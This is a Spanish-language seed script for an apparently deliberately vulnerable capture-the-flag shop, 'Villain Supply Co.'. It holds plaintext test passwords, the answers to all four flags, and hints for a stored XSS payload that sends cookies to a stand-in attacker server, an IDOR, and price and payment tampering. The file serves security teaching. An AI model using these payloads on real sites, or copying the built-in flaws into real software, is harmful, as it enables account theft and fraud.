const { getDb, initTables } = require('./init');

const db = getDb();

db.exec('DROP TABLE IF EXISTS order_items');
db.exec('DROP TABLE IF EXISTS reviews');
db.exec('DROP TABLE IF EXISTS orders');
db.exec('DROP TABLE IF EXISTS products');
db.exec('DROP TABLE IF EXISTS villains');
db.exec('DROP TABLE IF EXISTS flags');

initTables(db);

// ═══════════════════════════════════════
//  VILLANOS (Usuarios)
// ═══════════════════════════════════════
const insertVillain = db.prepare(`
  INSERT INTO villains (username, password, display_name, role, bio, session_token)
  VALUES (?, ?, ?, ?, ?, ?)
`);

const villains = [
  ['dr_maligno', 'password123', 'Dr. Maligno', 'admin',
    'CEO y Jefe Supremo de Villain Supply Co. Colecciona gatos persas y rayos de destrucción.',
    'admin-token-super-secreto-12345'],
  ['minion_42', 'esbirro2024', 'Esbirro #42', 'villain',
    'Empleado del mes 14 veces seguidas. Especialista en fracasar espectacularmente.',
    null],
  ['lady_caos', 'chaos666', 'Lady Caos', 'villain',
    'Ex-meteoróloga que descubrió que causar tormentas artificiales era más lucrativo.',
    null],
  ['prof_doom', 'doom1234', 'Profesor Doom', 'villain',
    'Ingeniero nuclear reconvertido. Sus inventos explotan el 60% de las veces.',
    null],
  ['hacker_fantasma', 'ghost_in_shell', 'El Fantasma Digital', 'villain',
    'Nadie sabe su identidad real. Pide todo a una dirección PO Box en una isla volcánica.',
    null],
];

for (const v of villains) {
  insertVillain.run(...v);
}

// ═══════════════════════════════════════
//  PRODUCTOS
// ═══════════════════════════════════════
const insertProduct = db.prepare(`
  INSERT INTO products (name, description, price, category, image_emoji, stock, featured)
  VALUES (?, ?, ?, ?, ?, ?, ?)
`);

const products = [
  ['Rayo Mortal de Destrucción Masiva',
    'El clásico que nunca falla (excepto cuando falla). Incluye manual de 800 páginas y garantía de 30 días.',
    1000000000, 'armas', '🔫', 3, 1],
  ['Tiburón con Láser Integrado',
    'Tiburón blanco de 4 metros con láser de 50MW montado en la cabeza. Alimentación incluida por 1 mes.',
    50000000, 'mascotas', '🦈', 7, 1],
  ['Pack 100 Uniformes de Esbirro (Talla Única)',
    'Monos naranjas ignífugos. Talla única que no le queda bien a nadie. Incluye logo personalizable.',
    15000, 'uniformes', '👔', 500, 0],
  ['Guarida Volcánica Premium (Alquiler Mensual)',
    'Volcán activo en isla privada del Pacífico. 15 habitaciones, hangar para 3 jets, piscina de lava decorativa.',
    2500000, 'guaridas', '🌋', 2, 1],
  ['Kit de Monólogo Villano Profesional',
    'Incluye atril giratorio, iluminación dramática, máquina de humo y 50 frases pre-escritas. "Les contaré mi plan..."',
    999, 'accesorios', '🎭', 200, 0],
  ['Gato Persa Blanco (Edición Malvada)',
    'Entrenado para sentarse en tu regazo durante reuniones amenazantes. Incluye trono compatible.',
    8500, 'mascotas', '🐱', 12, 0],
  ['Satélite Orbital de Vigilancia',
    'Resolución 0.5m. Capacidad de zoom en cualquier punto del planeta. Bonus: puede proyectar tu cara en la Luna.',
    750000000, 'tecnología', '🛰️', 1, 1],
  ['Submarino de Escape Unipersonal',
    'Para cuando el plan B también falla. Velocidad máx: 40 nudos. Autonomía: 72h. Snacks incluidos.',
    12000000, 'vehículos', '🚢', 5, 0],
  ['Dispositivo de Control Mental v3.2',
    'Ahora con Bluetooth. Alcance: 50 metros. No funciona en personas con gorros de aluminio.',
    340000, 'tecnología', '🧠', 15, 0],
  ['Trampa para Héroes Deluxe',
    'Jaula suspendida sobre foso con cocodrilos. Incluye temporizador visible y botón rojo grande que nunca debes dejar cerca del héroe.',
    75000, 'seguridad', '🪤', 30, 0],
];

for (const p of products) {
  insertProduct.run(...p);
}

// ═══════════════════════════════════════
//  PEDIDOS (incluye el pedido secreto de Dr. Maligno)
// ═══════════════════════════════════════
const insertOrder = db.prepare(`
  INSERT INTO orders (villain_id, status, payment_status, total_price, notes)
  VALUES (?, ?, ?, ?, ?)
`);

const insertOrderItem = db.prepare(`
  INSERT INTO order_items (order_id, product_id, quantity, unit_price)
  VALUES (?, ?, ?, ?)
`);

// Pedido 1: Dr. Maligno — contiene los planos secretos (bandera IDOR)
const order1 = insertOrder.run(
  1, 'completed', 'paid', 752500000,
  '🚨 ULTRA SECRETO 🚨 Planos de la guarida submarina en coordenadas 47.1234°N, 172.5678°W. Código de acceso: FLAG{idor_planos_secretos_dr_maligno}. NO COMPARTIR CON ESBIRROS DE NIVEL < 9.'
);
insertOrderItem.run(order1.lastInsertRowid, 4, 1, 2500000);
insertOrderItem.run(order1.lastInsertRowid, 7, 1, 750000000);

// Pedido 2: Esbirro #42
const order2 = insertOrder.run(
  2, 'shipped', 'paid', 15999,
  'Necesito los uniformes para la fiesta de fin de año.'
);
insertOrderItem.run(order2.lastInsertRowid, 3, 1, 15000);
insertOrderItem.run(order2.lastInsertRowid, 5, 1, 999);

// Pedido 3: Lady Caos
const order3 = insertOrder.run(
  3, 'pending', 'paid', 50008500,
  'Quiero que el tiburón sea de color rosa, por favor.'
);
insertOrderItem.run(order3.lastInsertRowid, 2, 1, 50000000);
insertOrderItem.run(order3.lastInsertRowid, 6, 1, 8500);

// Pedido 4: Prof. Doom
const order4 = insertOrder.run(
  4, 'pending', 'pending', 12340000,
  'Nota: mi último submarino explotó. Espero que este no.'
);
insertOrderItem.run(order4.lastInsertRowid, 8, 1, 12000000);
insertOrderItem.run(order4.lastInsertRowid, 9, 1, 340000);

// ═══════════════════════════════════════
//  RESEÑAS
// ═══════════════════════════════════════
const insertReview = db.prepare(`
  INSERT INTO reviews (villain_id, product_id, content, rating)
  VALUES (?, ?, ?, ?)
`);

const reviews = [
  [2, 3, 'Los uniformes se encogen al lavarlos. Ahora parezco un esbirro comprimido. 3/5', 3],
  [3, 2, 'El tiburón se comió a dos esbirros antes de que pudiéramos instalarle el láser. 10/10 compraría otro.', 5],
  [4, 9, 'El control mental funciona perfecto excepto en mi suegra. Producto defectuoso.', 2],
  [2, 5, 'Usé el kit de monólogo y el héroe se escapó mientras hablaba. Como siempre. Muy realista.', 4],
  [5, 10, 'La trampa es genial pero el botón rojo estaba demasiado cerca de la jaula. El héroe escapó en 30 segundos.', 1],
  [3, 6, 'El gato es adorable pero me araña cada vez que intento hacer una videollamada amenazante.', 4],
];

for (const r of reviews) {
  insertReview.run(...r);
}

// ═══════════════════════════════════════
//  BANDERAS CTF + PISTAS
// ═══════════════════════════════════════
const insertFlag = db.prepare(`
  INSERT INTO flags (challenge_key, flag_value, title, description, difficulty, hints_level1, hints_level2)
  VALUES (?, ?, ?, ?, ?, ?, ?)
`);

const flags = [
  ['cart_manipulation',
    'FLAG{carrito_gratis_rayo_mortal}',
    'Carrito Gratis',
    'Consigue comprar el "Rayo Mortal de Destrucción Masiva" ($1,000,000,000) por $0 o menos.',
    'easy',
    'Los precios no deberían decidirse en el cliente... ¿Qué pasa si el servidor confía ciegamente en lo que le envías?',
    'Intercepta la petición POST /api/cart/checkout con Burp Suite o las DevTools. Busca el campo "price" o "total" en el body JSON y cámbialo a 0.'],
  ['stored_xss',
    'FLAG{xss_esbirro_roba_cookies}',
    'XSS del Esbirro',
    'Roba la cookie del Jefe Supremo (admin) inyectando código en las reseñas de productos.',
    'medium',
    'Las reseñas de productos se muestran sin sanitizar. ¿Qué pasa si escribes algo que no es exactamente texto plano?',
    'Escribe una reseña con un payload como <script>document.location="http://tu-servidor?c="+document.cookie</script> o simplemente ejecuta un alert() con document.cookie.'],
  ['idor_orders',
    'FLAG{idor_planos_secretos_dr_maligno}',
    'Planos Secretos (IDOR)',
    'Lee el pedido #1 de Dr. Maligno que contiene los planos de su guarida secreta.',
    'easy',
    'Cuando consultas tus propios pedidos, la URL contiene un ID numérico. ¿El servidor verifica que ese pedido realmente te pertenece?',
    'Haz una petición GET /api/orders/1 estando logueado como cualquier otro usuario. Si no hay validación de propiedad, verás los datos del Dr. Maligno.'],
  ['payment_bypass',
    'FLAG{bypass_pago_soy_villain_vip}',
    'Bypass de Pago',
    'Completa una compra sin pagar manipulando el estado del pago.',
    'medium',
    'El sistema de pago confía en lo que el cliente le dice sobre el resultado de la transacción. ¿Quién valida realmente si pagaste?',
    'Intercepta la petición POST /api/orders/:id/pay. El servidor acepta un JSON con {"status": "success"} sin verificar con ningún procesador de pago. Envíalo directamente.'],
];

for (const f of flags) {
  insertFlag.run(...f);
}

console.log(`
╔══════════════════════════════════════════════════╗
║  🦹 Base de datos sembrada exitosamente          ║
╠══════════════════════════════════════════════════╣
║  Villanos:   ${villains.length}                                   ║
║  Productos:  ${products.length}                                  ║
║  Pedidos:    4                                   ║
║  Reseñas:    ${reviews.length}                                   ║
║  Banderas:   ${flags.length}                                   ║
╠══════════════════════════════════════════════════╣
║  🎯 Banderas CTF:                                ║
║  1. FLAG{carrito_gratis_rayo_mortal}             ║
║  2. FLAG{xss_esbirro_roba_cookies}               ║
║  3. FLAG{idor_planos_secretos_dr_maligno}        ║
║  4. FLAG{bypass_pago_soy_villain_vip}            ║
╚══════════════════════════════════════════════════╝
`);

db.close();
